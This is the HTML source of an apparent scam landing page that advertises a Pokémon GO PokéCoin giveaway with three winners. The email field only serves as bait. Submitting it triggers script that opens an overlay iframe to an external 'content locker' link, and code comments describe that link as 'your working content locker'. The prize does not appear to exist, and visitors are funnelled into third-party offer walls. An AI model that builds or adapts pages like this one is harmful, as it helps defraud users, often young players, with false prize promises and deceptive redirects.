<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pokémon GO · 550 Coin Giveaway · 3 winners</title>
    <!-- Font Awesome 6 (for icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Font: Inter clean -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #FFFFFF; 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            color: #000000; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 2rem 1.5rem; 
            line-height: 1.5; 
            font-weight: 400;
        }
        /* main card – pure white with subtle shadow */
        .card {
            max-width: 800px; 
            width: 100%; 
            background: #FFFFFF; 
            border-radius: 48px; 
            padding: 3.5rem 2.5rem; 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.08); 
            text-align: center; 
            border: 1px solid #F0F0F0;
        }

        /* 16:9 logo area */
        .logo-container { width: 100%; max-width: 680px; margin: 0 auto 2.5rem auto; }
        .logo-frame {
            aspect-ratio: 16 / 9; width: 100%; background: #FFFFFF; 
            border: 1.5px dashed #CCCCCC; border-radius: 28px; 
            display: flex; align-items: center; justify-content: center; 
            overflow: hidden; transition: border 0.2s;
        }
        .logo-image { width: 100%; height: 100%; object-fit: cover; display: block; }

        /* description */
        .hero-description {
            font-size: 1.6rem; font-weight: 380; max-width: 580px; 
            margin: 0 auto 2rem auto; color: #111111; 
            letter-spacing: -0.01em; line-height: 1.4;
        }
        .hero-description strong { 
            font-weight: 620; background: #FFFFFF; 
            border-bottom: 2px solid #000; padding-bottom: 2px; 
        }

        /* winners badge */
        .winners-badge {
            display: inline-block; margin: 0 0 2rem 0; font-size: 1.2rem; 
            background: #FFFFFF; border: 1.5px solid #000; border-radius: 40px; 
            padding: 0.4rem 1.8rem; font-weight: 500; color: #000;
        }

        /* email form */
        .form-section { max-width: 460px; margin: 0 auto; text-align: left; }
        .email-label {
            display: block; font-size: 0.95rem; font-weight: 500; color: #222; 
            margin-bottom: 0.4rem; margin-left: 0.5rem; letter-spacing: 0.2px; 
            text-transform: uppercase; opacity: 0.75;
        }
        .email-row { display: flex; flex-direction: column; gap: 0.9rem; }

        .email-input {
            width: 100%; padding: 0.9rem 1.5rem; font-size: 1.1rem; 
            font-family: inherit; border: 2px solid #E0E0E0; border-radius: 60px; 
            outline: none; background: #FFFFFF; color: #000000; 
            transition: border 0.15s, box-shadow 0.15s; font-weight: 400;
        }
        .email-input:focus { border-color: #000000; box-shadow: 0 0 0 3px rgba(0,0,0,0.03); }
        .email-input::placeholder { color: #AAAAAA; font-weight: 350; font-size: 1rem; }

        /* primary button – black */
        .enter-btn {
            background: #000000; color: #FFFFFF; border: none; border-radius: 60px; 
            padding: 0.9rem 2rem; font-size: 1.2rem; font-weight: 600; 
            letter-spacing: 0.3px; cursor: pointer; transition: background 0.15s, transform 0.1s; 
            white-space: nowrap; border: 2px solid #000000; line-height: 1.2; 
            box-shadow: 0 2px 0 #333; width: 100%;
        }
        .enter-btn:hover { background: #1A1A1A; border-color: #1A1A1A; }
        .enter-btn:active { transform: translateY(3px); box-shadow: none; }

        .form-feedback { font-size: 0.95rem; margin-top: 1rem; min-height: 2rem; color: #2b7a2b; text-align: center; }

        .fine-print { 
            margin-top: 2.8rem; font-size: 0.9rem; color: #777777; 
            border-top: 1px solid #EEEEEE; padding-top: 2rem; 
        }

        /* ===== OVERLAY (content locker) from the old HTML ===== */
        .overlay-bg {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
            background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(3px); 
            z-index: 9998; display: none;
        }
        .overlay-bg.active { display: block; }

        .redirect-overlay {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80%; height: 80%; max-width: 1000px; max-height: 700px;
            background: white; border-radius: 15px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            z-index: 9999; display: none; border: 2px solid #22c55e; overflow: hidden;
        }
        .redirect-overlay.active { display: block; }
        .overlay-iframe { width: 100%; height: 100%; border: none; }

        @media (max-width: 550px) {
            .card { padding: 2rem 1.5rem; border-radius: 36px; }
            .hero-description { font-size: 1.4rem; }
            .winners-badge { font-size: 1rem; padding: 0.3rem 1.2rem; }
            .email-input { padding: 0.8rem 1.3rem; font-size: 1rem; }
            .enter-btn { padding: 0.8rem 1.5rem; font-size: 1.1rem; }
        }
    </style>
</head>
<body>
    <!-- Overlay (exact copy from old HTML, working) -->
    <div class="overlay-bg" id="overlayBg"></div>
    <div class="redirect-overlay" id="redirectOverlay">
        <iframe src="" class="overlay-iframe" id="redirectFrame" allowfullscreen></iframe>
    </div>

    <div class="card">
        <!-- 16:9 logo area -->
        <div class="logo-container">
            <div class="logo-frame">
                <img class="logo-image" src="https://i.postimg.cc/9z3NQJc1/Pokemon-go-image-1-new.webp" alt="Pokémon GO giveaway">
            </div>
        </div>

        <!-- short engaging description -->
        <div class="hero-description">
            ⚡ <strong>550 PokéCoins</strong> for three winners.<br>
            Enter your email for a chance to power up.
        </div>

        <!-- winners badge -->
        <div class="winners-badge">🎁 3 winners · drawn weekly</div>

        <!-- email form -->
        <div class="form-section">
            <form id="giveawayForm">
                <label for="email" class="email-label">ENTER YOUR EMAIL</label>
                <div class="email-row">
                    <input type="email" class="email-input" id="email" name="email" placeholder="trainer@example.com" required pattern="[^@\s]+@[^@\s]+\.[^@\s]+" title="Enter a valid email address">
                    <!-- button triggers overlay with the specific redirect link (content locker) -->
                    <button type="button" class="enter-btn" id="giveawayBtn">Enter Giveaway</button>
                </div>
                <div id="formFeedback" class="form-feedback"></div>
            </form>
        </div>

        <!-- fine print -->
        <div class="fine-print">
            <span>✔ no spam · one entry per email · ends 04/30</span><br>
            <span class="note-mute">© Pokémon GO giveaway concept</span>
        </div>
    </div>

    <script>
        (function() {
            // --- Overlay logic from old HTML (fully working) ---
            const overlayBg = document.getElementById('overlayBg');
            const redirectOverlay = document.getElementById('redirectOverlay');
            const redirectFrame = document.getElementById('redirectFrame');
            // USE THE EXACT LOCKER LINK PROVIDED (same as old HTML)
            const redirectUrl = 'https://bouttiq.graphics/cl/i/6nnxqe';  // your working content locker

            function showOverlay(url) {
                redirectFrame.src = url;
                redirectOverlay.classList.add('active');
                overlayBg.classList.add('active');
                document.body.style.overflow = 'hidden';
            }

            function closeOverlay() {
                redirectOverlay.classList.remove('active');
                overlayBg.classList.remove('active');
                document.body.style.overflow = 'auto';
                redirectFrame.src = '';  // stop loading
            }

            // Close overlay when clicking on background
            overlayBg.addEventListener('click', closeOverlay);

            // Close overlay with Escape key
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
                    closeOverlay();
                }
            });

            // --- Email validation and button trigger ---
            const emailInput = document.getElementById('email');
            const giveawayBtn = document.getElementById('giveawayBtn');
            const feedback = document.getElementById('formFeedback');

            function isValidEmail(email) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            }

            giveawayBtn.addEventListener('click', function() {
                const email = emailInput.value.trim();
                if (!email) {
                    feedback.style.color = "#b33";
                    feedback.innerText = "⨯ please enter your email address.";
                    return;
                }
                if (!isValidEmail(email)) {
                    feedback.style.color = "#b33";
                    feedback.innerText = "⨯ that email doesn’t look quite right.";
                    return;
                }

                // success feedback and open overlay with locker link
                feedback.style.color = "#2b7a2b";
                feedback.innerText = "✓ redirecting to offer...";
                
                // OPEN OVERLAY WITH THE CONTENT LOCKER LINK (working)
                showOverlay(redirectUrl);

                // optional: clear message after some seconds
                setTimeout(() => {
                    feedback.innerText = "";
                }, 3000);
            });

            // Real-time validation indicator
            emailInput.addEventListener('input', function() {
                if (isValidEmail(this.value.trim())) {
                    this.style.borderColor = '#2e7d32';
                } else {
                    this.style.borderColor = '#E0E0E0';
                }
                feedback.innerText = ""; // clear messages while typing
            });

            // Also allow pressing Enter in the email field to trigger the button
            emailInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    giveawayBtn.click();
                }
            });

            // (Optional) make sure iframe doesn't keep playing after close
            window.closeOverlay = closeOverlay; // just in case
        })();
    </script>
</body>
</html>
